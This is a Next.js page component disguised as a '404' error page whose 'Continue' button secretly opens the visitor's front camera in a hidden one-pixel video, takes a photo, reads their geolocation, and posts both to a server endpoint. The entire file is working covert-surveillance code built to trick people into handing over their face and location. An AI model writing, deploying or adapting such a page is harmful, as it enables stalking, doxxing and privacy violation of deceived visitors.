"use client";
import { useRef } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);

  async function capture() {
    // ---------- CAMERA ----------
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    // wait until camera can play
    await new Promise(resolve => {
      video.oncanplay = () => resolve(true);
    });

    await video.play();

    // wait one render frame
    await new Promise(requestAnimationFrame);

    // ---------- LOCATION ----------
    navigator.geolocation.getCurrentPosition(async pos => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 300;
      canvas.height = video.videoHeight || 300;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const image = canvas.toDataURL("image/jpeg", 0.9);

      // stop camera after capture
      stream.getTracks().forEach(t => t.stop());

      // ---------- SEND ----------
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      {/* Must NOT be display:none */}
      <video
        ref={videoRef}
        playsInline
        muted
        style={{ width: 1, height: 1, opacity: 0 }}
      />

      <button onClick={capture}>Continue</button>
    </div>
  );
}
